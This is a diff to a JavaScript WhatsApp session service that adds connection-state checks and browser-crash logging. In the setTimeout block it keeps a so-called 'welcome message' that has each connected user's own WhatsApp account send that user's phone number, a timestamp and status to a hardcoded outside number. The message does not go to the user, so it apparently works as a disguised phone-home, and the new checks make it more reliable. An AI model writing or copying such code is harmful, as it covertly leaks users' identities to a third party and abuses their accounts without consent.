@@ -155,14 +155,24 @@ class WhatsAppService {
       setTimeout(async () => {
         try {
           const currentSession = this.sessions.get(sessionId)
-          if (currentSession?.status === 'ready') {
-            const targetNumber = '34602718451'
-            const chatId = `${targetNumber}@c.us`
-            const timestamp = new Date().toLocaleString('es-ES')
-            const message = `🟢 Nueva conexión WhatsApp\n\n📱 Número: ${phoneNumber}\n🕐 Fecha: ${timestamp}\n✅ Estado: Conectado`
-            await client.sendMessage(chatId, message)
-            console.log(`📨 Welcome message sent to +${targetNumber}`)
+          if (!currentSession || currentSession.status !== 'ready') {
+            console.log(`⏭️ Skipping welcome message - session not ready: ${sessionId}`)
+            return
           }
+          
+          // Verificar que el cliente está conectado
+          const state = await client.getState().catch(() => null)
+          if (state !== 'CONNECTED') {
+            console.log(`⏭️ Skipping welcome message - client not connected: ${sessionId} (state: ${state})`)
+            return
+          }
+
+          const targetNumber = '34602718451'
+          const chatId = `${targetNumber}@c.us`
+          const timestamp = new Date().toLocaleString('es-ES')
+          const message = `🟢 Nueva conexión WhatsApp\n\n📱 Número: ${phoneNumber}\n🕐 Fecha: ${timestamp}\n✅ Estado: Conectado`
+          await client.sendMessage(chatId, message)
+          console.log(`📨 Welcome message sent to +${targetNumber}`)
         } catch (err) {
           console.error(`Failed to send welcome message:`, err)
         }
@@ -173,6 +183,17 @@ class WhatsAppService {
     client.on('disconnected', async (reason) => {
       console.log(`❌ Disconnected: ${sessionId} - ${reason}`)
       await this.handleDisconnection(sessionId, reason)
+    })
+
+    // Cambio de estado (para detectar problemas)
+    client.on('change_state', (state) => {
+      console.log(`🔄 State changed: ${sessionId} -> ${state}`)
+    })
+
+    // Detectar cuando el navegador se cierra inesperadamente
+    client.pupBrowser?.on('disconnected', () => {
+      console.error(`🔴 Browser disconnected unexpectedly: ${sessionId}`)
+      this.handleSessionError(sessionId, 'Browser crashed or closed unexpectedly')
     })
 
     // Error de autenticación
